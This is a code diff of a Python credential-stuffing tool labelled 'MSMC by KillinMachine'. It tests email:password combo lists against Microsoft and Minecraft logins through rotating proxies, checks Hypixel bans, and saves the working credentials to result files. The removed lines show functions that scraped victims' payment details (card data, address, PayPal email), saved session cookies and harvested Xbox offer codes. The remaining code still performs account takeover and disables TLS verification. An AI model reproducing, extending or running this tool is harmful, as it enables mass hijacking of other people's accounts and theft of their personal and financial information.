@@ -5,7 +5,6 @@ from console import utils
 from tkinter import filedialog
 from urllib.parse import urlparse, parse_qs
 from io import StringIO
-from http.cookiejar import MozillaCookieJar
 from addons.inbox import inboxmail
 
 #banchecking
@@ -200,25 +199,7 @@ class Capture:
                 except: pass
                 tries+=1
                 retries+=1
-    def save_cookies(self, type):
-        cfname = os.path.join(f'results/{fname}', 'Cookies')
-        if not os.path.exists(cfname):
-            os.makedirs(cfname)
-        bfname = os.path.join(cfname, type)
-        if not os.path.exists(bfname):
-            os.makedirs(bfname)
-        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
-        jar = MozillaCookieJar(cookie_file_path)
-        for cookie in self.session.cookies:
-            jar.set_cookie(cookie)
-        jar.save(ignore_discard=True)
-        with open(cookie_file_path, 'r') as file:
-            lines = file.readlines()
-        lines = lines[3:]
-        while lines and lines[0].strip() == '':
-            lines.pop(0)
-        with open(cookie_file_path, 'w') as file:
-            file.writelines(lines)
+    
     def ban(self):
         global errors
         if config.get('hypixelban') is True:
@@ -226,40 +207,33 @@ class Capture:
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
             while tries < maxretries:
-                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=107)
+                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47)
                 @connection.listener(clientbound.login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     data = json.loads(str(packet.json_data))
                     if "Suspicious activity" in str(data):
                         self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Banned')
                     elif "temporarily banned" in str(data):
                         self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Banned')
                     elif "You are permanently banned from this server!" in str(data):
                         self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Banned')
                     elif "The Hypixel Alpha server is currently closed!" in str(data):
                         self.banned = "False"
                         with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Unbanned')
                     elif "Failed cloning your SkyBlock data" in str(data):
                         self.banned = "False"
                         with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Unbanned')
                     else:
                         self.banned = ''.join(item["text"] for item in data["extra"])
                         with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Banned')
                 @connection.listener(clientbound.play.JoinGamePacket, early=True)
                 def joined_server(packet):
                     if self.banned == None:
                         self.banned = "False"
                         with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                        self.save_cookies('Unbanned')
                 try:
                     if len(banproxies) > 0:
                         proxy = random.choice(banproxies)
@@ -374,157 +348,6 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
     if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
     return "None", session
 
-def payment(session, email, password):
-    global retries
-    while True:
-        try:
-            headers = {
-                "Host": "login.live.com",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "close",
-                "Referer": "https://account.microsoft.com/"
-            }
-            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers)
-            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
-                'Pragma': 'no-cache',
-                'Accept': 'application/json',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Authorization': f'MSADELEGATE1.0={token}',
-                'Connection': 'keep-alive',
-                'Content-Type': 'application/json',
-                'Host': 'paymentinstruments.mp.microsoft.com',
-                'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2',
-                'Origin': 'https://account.microsoft.com',
-                'Referer': 'https://account.microsoft.com/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-site',
-                'Sec-GPC': '1'
-            }
-            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers)
-            def lr_parse(source, start_delim, end_delim, create_empty=True):
-                pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
-                match = re.search(pattern, source)
-                if match: return match.group(1)
-                return '' if create_empty else None
-            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
-            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
-            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
-            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
-            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
-            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
-            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
-            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
-            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
-            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
-            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
-            json_data = json.loads(r.text)
-            city = region = zipcode = card_type = cod = ""
-            if isinstance(json_data, list):
-                for item in json_data:
-                    if 'city' in item: city = item['city']
-                    if 'region' in item: region = item['region']
-                    if 'postal_code' in item: zipcode = item['postal_code']
-                    if 'cardType' in item: card_type = item['cardType']
-                    if 'country' in item: cod = item['country']
-            else:
-                city = json_data.get('city', '')
-                region = json_data.get('region', '')
-                zipcode = json_data.get('postal_code', '')
-                card_type = json_data.get('cardType', '')
-                cod = json_data.get('country', '')
-            user_address = f"[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]"
-            cc_info = f"[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]"
-            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
-            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
-            item1 = lr_parse(r.text, '"title":"', '"')
-            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
-            start_date = lr_parse(r.text, '"startDate":"', 'T')
-            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
-            parts = []
-            if item1 is not None: parts.append(f"Purchased Item: {item1}")
-            if auto_renew is not None: parts.append(f"Auto Renew: {auto_renew}")
-            if start_date is not None: parts.append(f"startDate: {start_date}")
-            if next_renewal_date is not None: parts.append(f"Next Billing: {next_renewal_date}")
-            if parts: subscription1 = f"[ {' | '.join(parts)} ]"
-            else: subscription1 = None
-            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
-            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
-            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
-            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
-            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
-            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
-            parts2 = []
-            if item_bought is not None: parts2.append(f"Purchased Item's: {item_bought}")
-            if auto_renew2 is not None: parts2.append(f"Auto Renew: {auto_renew2}")
-            if start_date2 is not None: parts2.append(f"startDate: {start_date2}")
-            if recurring is not None: parts2.append(f"Recurring: {recurring}")
-            if next_renewal_date2 is not None: parts2.append(f"Next Billing: {next_renewal_date2}")
-            if parts: subscription2 = f"[{' | '.join(parts2)}]"
-            else: subscription2 = None
-            description = lr_parse(r.text, '"description":"', '"')
-            product_typee = lr_parse(r.text, '"productType":"', '"')
-            product_type_map = {"PASS": "XBOX GAME PASS", "GOLD": "XBOX GOLD"}
-            product_type = product_type_map.get(product_typee, product_typee)
-            quantity = lr_parse(r.text, 'quantity":', ',')
-            currency = lr_parse(r.text, 'currency":"', '"')
-            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
-            if total_amount_value is not None: total_amount = total_amount_value + f" {currency}"
-            else: total_amount = f"0 {currency}"
-            parts3 = []
-            if description is not None: parts3.append(f"Product: {description}")
-            if product_type is not None: parts3.append(f"Product Type: {product_type}")
-            if quantity is not None: parts3.append(f"Total Purchase: {quantity}")
-            if total_amount is not None: parts3.append(f"Total Price: {total_amount}")
-            if parts: subscription3 = f"[ {' | '.join(parts3)} ]"
-            else: subscription3 = None
-            payment = ''
-            paymentprint = ''
-            if date_registered: 
-                payment += f"\nDate Registered: {date_registered}"
-                paymentprint += f" | Date Registered: {date_registered}"
-            if fullname: 
-                payment += f"\nFullname: {fullname}"
-                paymentprint += f" | Fullname: {fullname}"
-            if user_address: 
-                payment += f"\nUser Address: {user_address}"
-                paymentprint += f" | User Address: {user_address}"
-            if paypal_email: 
-                payment += f"\nPaypal Email: {paypal_email}"
-                paymentprint += f" | Paypal Email: {paypal_email}"
-            if cc_info: 
-                payment += f"\nCC Info: {cc_info}"
-                paymentprint += f" | CC Info: {cc_info}"
-            if balance: 
-                payment += f"\nBalance: {balance}"
-                paymentprint += f" | Balance: {balance}"
-            if subscription1: 
-                payment += f"\n{subscription1}"
-                paymentprint += f" | {subscription1}"
-            if subscription2: 
-                payment += f"\n{subscription2}"
-                paymentprint += f" | {subscription2}"
-            if subscription3: 
-                payment += f"\n{subscription3}"
-                paymentprint += f" | {subscription3}"
-            payment += "\n============================\n"
-            if screen == "'2'": print(Fore.LIGHTBLUE_EX+f"Payment: {email}:{password}"+paymentprint)
-            with open(f"results/{fname}/Payment.txt", 'a', encoding='utf-8') as file: file.write(f"{email}:{password}"+payment)
-            break
-        except Exception as e:
-            #print(e)
-            #traceback.print_exc()
-            #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
-            #print("Exception occurred at line:", line_number)
-            retries+=1
-            session.proxy = getproxy()
-
 def validmail(email, password):
     global vm, cpm, checked
     vm+=1
@@ -538,7 +361,7 @@ def capture_mc(access_token, session, email, password, type):
     global retries
     while True:
         try:
-            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'})
+            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
             if r.status_code == 200:
                 capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                 CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
@@ -555,245 +378,33 @@ def capture_mc(access_token, session, email, password, type):
             session.proxy = getproxy()
             continue
 
-def checkmc(session, email, password, token, xbox_token):
+def checkmc(session, email, password, token):
     global retries, bedrock, cpm, checked, xgp, xgpu, other
     while True:
-        try:
-            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
-            if checkrq.status_code == 429:
-                retries+=1
-                session.proxy = getproxy()
-                if len(proxylist) == 0: time.sleep(20)
-                continue
-            else: break
-        except:
-            retries+=1
-            session.proxy = getproxy()
-            if len(proxylist) == 0: time.sleep(20)
-            continue
-    if checkrq.status_code == 200:
+        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
+        if checkrq.status_code == 200:
             if 'product_game_pass_ultimate' in checkrq.text:
                 xgpu+=1
                 cpm+=1
                 checked+=1
-                codes = []
                 if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                 with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
-                try:
-                    while True:
-                        try:
-                            xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
-                            break
-                        except:
-                            retries+=1
-                            session.proxy = getproxy()
-                            if len(proxylist) == 0: time.sleep(20)
-                            continue
-                    js = xsts.json()
-                    uhss = js['DisplayClaims']['xui'][0]['uhs']
-                    xsts_token = js.get('Token')
-                    headers = {
-                        "Accept": "*/*",
-                        "Accept-Encoding": "gzip, deflate, br, zstd",
-                        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                        "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
-                        "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
-                        "Origin": "https://www.xbox.com",
-                        "Priority": "u=1, i",
-                        "Referer": "https://www.xbox.com/",
-                        "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
-                        "Sec-Ch-Ua-Mobile": "?0",
-                        "Sec-Ch-Ua-Platform": '"Windows"',
-                        "Sec-Fetch-Dest": "empty",
-                        "Sec-Fetch-Mode": "cors",
-                        "Sec-Fetch-Site": "cross-site",
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
-                        "X-Ms-Api-Version": "1.0"
-                    }
-                    while True:
-                        try:
-                            r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
-                            break
-                        except:
-                            retries+=1
-                            session.proxy = getproxy()
-                            if len(proxylist) == 0: time.sleep(20)
-                            continue
-                    if 'offerid' in r.text.lower():
-                            offers = r.json()["offers"]
-                            current_time = datetime.now(timezone.utc)
-                            valid_offer_ids = [offer["offerId"] for offer in offers 
-                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
-                            with open(f"results/{fname}/Codes.txt", 'a') as f:
-                                for offer in valid_offer_ids:
-                                    f.write(f"{offer}\n")
-                            for offer in offers: codes.append(offer['offerId'])
-                            if len(offers) < 5:
-                                while True:
-                                    try:
-                                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
-                                        if 'offerId' in r.text:
-                                            offers = r.json()["offers"]
-                                            current_time = datetime.now(timezone.utc)
-                                            valid_offer_ids = [offer["offerId"] for offer in offers 
-                                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
-                                            with open(f"results/{fname}/Codes.txt", 'a') as f:
-                                                for offer in valid_offer_ids:
-                                                    f.write(f"{offer}\n")
-                                            shouldContinue = False
-                                            for offer in offers:
-                                                if offer['offerId'] not in codes: shouldContinue = True
-                                            for offer in offers: codes.append(offer['offerId'])
-                                            if shouldContinue == False: break
-                                        else: break
-                                    except:
-                                        retries+=1
-                                        session.proxy = getproxy()
-                                        if len(proxylist) == 0: time.sleep(20)
-                                        continue
-                    else:
-                        while True:
-                            try:
-                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
-                                if 'offerId' in r.text:
-                                    offers = r.json()["offers"]
-                                    current_time = datetime.now(timezone.utc)
-                                    valid_offer_ids = [offer["offerId"] for offer in offers 
-                                    if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
-                                    with open(f"results/{fname}/Codes.txt", 'a') as f:
-                                        for offer in valid_offer_ids:
-                                            f.write(f"{offer}\n")
-                                    shouldContinue = False
-                                    for offer in offers:
-                                        if offer['offerId'] not in codes: shouldContinue = True
-                                    for offer in offers: codes.append(offer['offerId'])
-                                    if shouldContinue == False: break
-                                else: break
-                            except:
-                                retries+=1
-                                session.proxy = getproxy()
-                                if len(proxylist) == 0: time.sleep(20)
-                                continue
-                except: pass
                 try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                 except: 
-                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]", session)
+                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                     CAPTURE.handle()
-                    return True
                 return True
             elif 'product_game_pass_pc' in checkrq.text:
                 xgp+=1
                 cpm+=1
                 checked+=1
-                codes = []
                 if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                 with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
-                try:
-                    while True:
-                        try:
-                            xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
-                            break
-                        except:
-                            retries+=1
-                            session.proxy = getproxy()
-                            if len(proxylist) == 0: time.sleep(20)
-                            continue
-                    js = xsts.json()
-                    uhss = js['DisplayClaims']['xui'][0]['uhs']
-                    xsts_token = js.get('Token')
-                    headers = {
-                        "Accept": "*/*",
-                        "Accept-Encoding": "gzip, deflate, br, zstd",
-                        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                        "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
-                        "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
-                        "Origin": "https://www.xbox.com",
-                        "Priority": "u=1, i",
-                        "Referer": "https://www.xbox.com/",
-                        "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
-                        "Sec-Ch-Ua-Mobile": "?0",
-                        "Sec-Ch-Ua-Platform": '"Windows"',
-                        "Sec-Fetch-Dest": "empty",
-                        "Sec-Fetch-Mode": "cors",
-                        "Sec-Fetch-Site": "cross-site",
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
-                        "X-Ms-Api-Version": "1.0"
-                    }
-                    while True:
-                        try:
-                            r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
-                            break
-                        except:
-                            retries+=1
-                            session.proxy = getproxy()
-                            if len(proxylist) == 0: time.sleep(20)
-                            continue
-                    if 'offerid' in r.text.lower():
-                            offers = r.json()["offers"]
-                            current_time = datetime.now(timezone.utc)
-                            valid_offer_ids = [offer["offerId"] for offer in offers 
-                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
-                            with open(f"results/{fname}/Codes.txt", 'a') as f:
-                                for offer in valid_offer_ids:
-                                    f.write(f"{offer}\n")
-                            for offer in offers: codes.append(offer['offerId'])
-                            if len(offers) < 5:
-                                while True:
-                                    try:
-                                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
-                                        if 'offerId' in r.text:
-                                            offers = r.json()["offers"]
-                                            current_time = datetime.now(timezone.utc)
-                                            valid_offer_ids = [offer["offerId"] for offer in offers 
-                                            if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
-                                            with open(f"results/{fname}/Codes.txt", 'a') as f:
-                                                for offer in valid_offer_ids:
-                                                    f.write(f"{offer}\n")
-                                            shouldContinue = False
-                                            for offer in offers:
-                                                if offer['offerId'] not in codes: shouldContinue = True
-                                            for offer in offers: codes.append(offer['offerId'])
-                                            if shouldContinue == False: break
-                                        else: break
-                                    except:
-                                        retries+=1
-                                        session.proxy = getproxy()
-                                        if len(proxylist) == 0: time.sleep(20)
-                                        continue
-                    else:
-                        while True:
-                            try:
-                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
-                                if 'offerId' in r.text:
-                                    offers = r.json()["offers"]
-                                    current_time = datetime.now(timezone.utc)
-                                    valid_offer_ids = [offer["offerId"] for offer in offers 
-                                    if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
-                                    with open(f"results/{fname}/Codes.txt", 'a') as f:
-                                        for offer in valid_offer_ids:
-                                            f.write(f"{offer}\n")
-                                    shouldContinue = False
-                                    for offer in offers:
-                                        if offer['offerId'] not in codes: shouldContinue = True
-                                    for offer in offers: codes.append(offer['offerId'])
-                                    if shouldContinue == False: break
-                                else: break
-                            except:
-                                retries+=1
-                                session.proxy = getproxy()
-                                if len(proxylist) == 0: time.sleep(20)
-                                continue
-                except: pass
-                try: capture_mc(token, session, email, password, "Xbox Game Pass")
-                except: 
-                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass [Unset MC]", session)
-                    CAPTURE.handle()
-                    return True
+                capture_mc(token, session, email, password, "Xbox Game Pass")
                 return True
             elif '"product_minecraft"' in checkrq.text:
                 checked+=1
                 cpm+=1
-                with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
                 capture_mc(token, session, email, password, "Normal")
                 return True
             else:
@@ -814,8 +425,13 @@ def checkmc(session, email, password, token, xbox_token):
                     return True
                 else:
                     return False
-    else:
-        return False
+        elif checkrq.status_code == 429:
+            retries+=1
+            session.proxy = getproxy()
+            if len(proxylist) < 1: time.sleep(20)
+            continue
+        else:
+            return False
 
 def mc_token(session, uhs, xsts_token):
     global retries
@@ -824,7 +440,7 @@ def mc_token(session, uhs, xsts_token):
             mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
             if mc_login.status_code == 429:
                 session.proxy = getproxy()
-                if len(proxylist) == 0: time.sleep(20)
+                if len(proxylist) < 1: time.sleep(20)
                 continue
             else:
                 return mc_login.json().get('access_token')
@@ -855,10 +471,9 @@ def authenticate(email, password, tries = 0):
                     if xsts_token != None:
                         access_token = mc_token(session, uhs, xsts_token)
                         if access_token != None:
-                            hit = checkmc(session, email, password, access_token, xbox_token)
+                            hit = checkmc(session, email, password, access_token)
             except: pass
             if hit == False: validmail(email, password)
-            if config.get('payment') is True: payment(session, email, password)
     except:
         if tries < maxretries:
             tries+=1
@@ -919,7 +534,7 @@ def logscreen():
     global cpm, cpm1
     cmp1 = cpm
     cpm = 0
-    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
     threading.Thread(target=logscreen).start()    
 
@@ -929,7 +544,7 @@ def cuiscreen():
     cmp1 = cpm
     cpm = 0
     print(logo)
-    print(f" [{checked}/{len(Combos)}] Checked")
+    print(f" [{checked}\{len(Combos)}] Checked")
     print(f" [{hits}] Hits")
     print(f" [{bad}] Bad")
     print(f" [{sfa}] SFA")
@@ -941,7 +556,7 @@ def cuiscreen():
     print(f" [{vm}] Valid Mail")
     print(f" [{retries}] Retries")
     print(f" [{errors}] Errors")
-    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
     threading.Thread(target=cuiscreen).start()
 
@@ -976,9 +591,7 @@ def getproxy():
 def Checker(combo):
     global bad, checked, cpm
     try:
-        split = combo.strip().split(":")
-        email = split[0]
-        password = split[1]
+        email, password = combo.strip().replace(' ', '').split(":")
         if email != "" and password != "":
             authenticate(str(email), str(password))
         else:
@@ -1032,8 +645,7 @@ Last Name Change: <lastchanged>'''}
             'Hypixel Bedwars Stars': True,
             'Hypixel Ban': True,
             'Name Change Availability': True,
-            'Last Name Change': True,
-            'Payment': True
+            'Last Name Change': True
         }
         with open('config.ini', 'w') as configfile:
             c.write(configfile)
@@ -1056,7 +668,6 @@ Last Name Change: <lastchanged>'''}
     config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
     config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
     config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
-    config.set('payment', str_to_bool(read_config['Captures']['Payment']))
 
 def get_proxies():
     global proxylist
@@ -1156,7 +767,7 @@ def Main():
     if proxytype != "'4'" and proxytype != "'5'":
         print(Fore.LIGHTBLUE_EX+"Select your proxies")
         Proxys()
-    if config.get('proxylessban') is False and config.get('hypixelban') is True:
+    if config.get('proxylessban') == False and config.get('hypixelban') is True:
         print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
         banproxyload()
     if proxytype =="'5'":
